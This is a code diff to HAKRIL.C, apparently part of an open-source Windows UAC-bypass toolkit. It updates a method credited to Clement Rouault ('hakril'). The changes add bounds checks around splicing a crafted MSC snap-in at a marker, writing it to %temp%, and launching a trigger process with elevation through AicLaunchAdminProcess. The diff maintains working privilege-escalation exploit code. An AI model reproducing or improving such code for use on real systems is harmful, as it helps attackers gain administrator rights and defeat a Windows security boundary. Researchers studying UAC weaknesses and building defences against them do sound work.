@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2022
+*  (C) COPYRIGHT AUTHORS, 2017 - 2025
 *
 *  TITLE:       HAKRIL.C
 *
-*  VERSION:     3.61
+*  VERSION:     3.69
 *
-*  DATE:        22 Jun 2022
+*  DATE:        07 Jul 2025
 *
 *  UAC bypass method from Clement Rouault aka hakril.
 *
@@ -142,7 +142,8 @@ NTSTATUS ucmHakrilMethod(
         // Reconfigure msc snapin and write it to the %temp%.
         //
         pszMarker = _strstri_a((CHAR*)SnapinData, (const CHAR*)KAMIKAZE_MARKER);
-        if (pszMarker) {
+        if (pszMarker && pszMarker >= (CHAR*)SnapinData &&
+            pszMarker < ((CHAR*)SnapinData + SnapinSize)) {
 
             //
             // Copy first part of snapin (unchanged).
@@ -161,13 +162,17 @@ NTSTATUS ucmHakrilMethod(
             //
             // Copy all of the rest.
             //
-            while (*pszMarker != 0 && *pszMarker != '<') {
+            while (*pszMarker != 0 && *pszMarker != '<' &&
+                pszMarker < ((CHAR*)SnapinData + SnapinSize)) 
+            {
                 pszMarker++;
             }
 
-            MscBytesIO = (ULONG)(((PCHAR)SnapinData + SnapinSize) - pszMarker);
-            RtlCopyMemory(RtlOffsetToPointer(MscBufferPtr, MscSize), pszMarker, MscBytesIO);
-            MscSize += MscBytesIO;
+            if (pszMarker < ((CHAR*)SnapinData + SnapinSize)) {
+                MscBytesIO = (ULONG)(((PCHAR)SnapinData + SnapinSize) - pszMarker);
+                RtlCopyMemory(RtlOffsetToPointer(MscBufferPtr, MscSize), pszMarker, MscBytesIO);
+                MscSize += MscBytesIO;
+            }
 
             //
             // Write result to the file.
@@ -193,6 +198,7 @@ NTSTATUS ucmHakrilMethod(
         //
         // Run trigger application.
         //
+        RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
         if (AicLaunchAdminProcess(szBuffer,
             szParams,
             1, //elevate
